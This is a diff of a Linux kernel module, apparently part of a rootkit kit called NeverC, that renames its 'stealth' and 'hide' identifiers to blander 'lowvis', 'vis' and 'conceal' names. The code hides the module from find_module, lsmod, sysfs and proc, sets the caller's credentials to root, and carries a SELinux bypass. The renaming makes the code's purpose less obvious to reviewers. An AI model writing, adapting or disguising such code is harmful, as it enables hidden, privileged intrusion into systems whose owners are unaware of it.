@@ -1,17 +1,17 @@
 /* SPDX-License-Identifier: GPL-2.0 */
 #include <nvkmod.h>
 #include <nvk_interpose.h>
-#include <nvk_hide.h>
+#include <nvk_vis.h>
 #include <nvk_process.h>
 #include <nvk_cred.h>
 #include <nvk_mem.h>
 #include <nvk_selinux.h>
 
-#define NEVERC_KRT_LOG_TAG "neverc_krt_stealth"
+#define NEVERC_KRT_LOG_TAG "neverc_krt_lowvis"
 #include <nvk_log.h>
 
-static struct neverc_krt_hide_state hide_state = NEVERC_KRT_HIDE_INIT_STATE;
-#ifdef NEVERC_KRT_STEALTH_SELINUX
+static struct neverc_krt_vis_state vis_state = NEVERC_KRT_VIS_INIT_STATE;
+#ifdef NVK_LOWVIS_SELINUX
 static struct neverc_krt_selinux_bypass selinux_state;
 #endif
 
@@ -32,7 +32,7 @@ static void interpose_find_module_ctx(neverc_krt_reg_ctx *ctx)
 {
 	const char *name = (const char *)NEVERC_KRT_CTX_ARG(ctx, 0);
 
-	if (name && neverc_krt_str_eq(name, "neverc_krt_stealth"))
+	if (name && neverc_krt_str_eq(name, "neverc_krt_lowvis"))
 		NEVERC_KRT_CTX_SKIP(ctx, 0);
 }
 
@@ -43,14 +43,14 @@ static find_module_fn orig_find_module;
 
 static void *interpose_find_module(const char *name)
 {
-	if (name && neverc_krt_str_eq(name, "neverc_krt_stealth"))
+	if (name && neverc_krt_str_eq(name, "neverc_krt_lowvis"))
 		return (void *)0;
 	return orig_find_module(name);
 }
 
 #endif
 
-static int neverc_krt_stealth_init(void)
+static int neverc_krt_lowvis_init(void)
 {
 	int ret;
 	void *target;
@@ -63,7 +63,7 @@ static int neverc_krt_stealth_init(void)
 
 	neverc_krt_mem_init();
 	neverc_krt_process_init();
-	neverc_krt_hide_init();
+	neverc_krt_vis_init();
 	neverc_krt_cred_init();
 
 	ret = neverc_krt_interpose_init();
@@ -88,17 +88,17 @@ static int neverc_krt_stealth_init(void)
 			neverc_krt_log_info("find_module interposed\n");
 	}
 
-#ifdef NEVERC_KRT_STEALTH_FULL_HIDE
-	neverc_krt_mod_full_hide(&hide_state, &__this_module, "neverc_krt_stealth");
+#ifdef NVK_LOWVIS_FULL_HIDE
+	neverc_krt_vis_full_conceal(&vis_state, &__this_module, "neverc_krt_lowvis");
 	neverc_krt_log_info("deep-hidden (list+sysfs+proc)\n");
-#elif defined(NEVERC_KRT_STEALTH_HIDE)
-	neverc_krt_mod_hide(&hide_state, &__this_module);
+#elif defined(NVK_LOWVIS_HIDE)
+	neverc_krt_vis_conceal(&vis_state, &__this_module);
 	neverc_krt_log_info("hidden from lsmod\n");
 #else
 	neverc_krt_log_info("log-only mode\n");
 #endif
 
-#ifdef NEVERC_KRT_STEALTH_ROOT
+#ifdef NVK_LOWVIS_ROOT
 	ret = neverc_krt_cred_set_root();
 	if (ret == 0)
 		neverc_krt_log_info("credentials elevated\n");
@@ -106,7 +106,7 @@ static int neverc_krt_stealth_init(void)
 		neverc_krt_log_warn("cred elevation failed\n");
 #endif
 
-#ifdef NEVERC_KRT_STEALTH_SELINUX
+#ifdef NVK_LOWVIS_SELINUX
 	if (neverc_krt_selinux_init() == 0) {
 		neverc_krt_log_info("selinux enforcing=%d\n",
 			     neverc_krt_selinux_is_enforcing());
@@ -122,24 +122,24 @@ static int neverc_krt_stealth_init(void)
 	return 0;
 }
 
-static void neverc_krt_stealth_exit(void)
+static void neverc_krt_lowvis_exit(void)
 {
-#ifdef NEVERC_KRT_STEALTH_SELINUX
+#ifdef NVK_LOWVIS_SELINUX
 	neverc_krt_selinux_set_enforcing();
 #endif
 #ifdef NEVERC_KRT_CONTEXT_INTERPOSE
 	neverc_krt_interpose_remove_ctx(&find_module_ctx);
 #endif
-	neverc_krt_hide_remove_interposes();
-	neverc_krt_mod_show(&hide_state, &__this_module);
+	neverc_krt_vis_remove_interposes();
+	neverc_krt_vis_reveal(&vis_state, &__this_module);
 	neverc_krt_log_info("unloaded\n");
 }
 
-module_init(neverc_krt_stealth_init);
-module_exit(neverc_krt_stealth_exit);
+module_init(neverc_krt_lowvis_init);
+module_exit(neverc_krt_lowvis_exit);
 
 MODULE_LICENSE("GPL v2");
 MODULE_AUTHOR("NeverC");
-MODULE_DESCRIPTION("NeverC stealth demo");
+MODULE_DESCRIPTION("NeverC lowvis demo");
 
-NEVERC_KRT_DEFINE_MODULE("neverc_krt_stealth");
+NEVERC_KRT_DEFINE_MODULE("neverc_krt_lowvis");
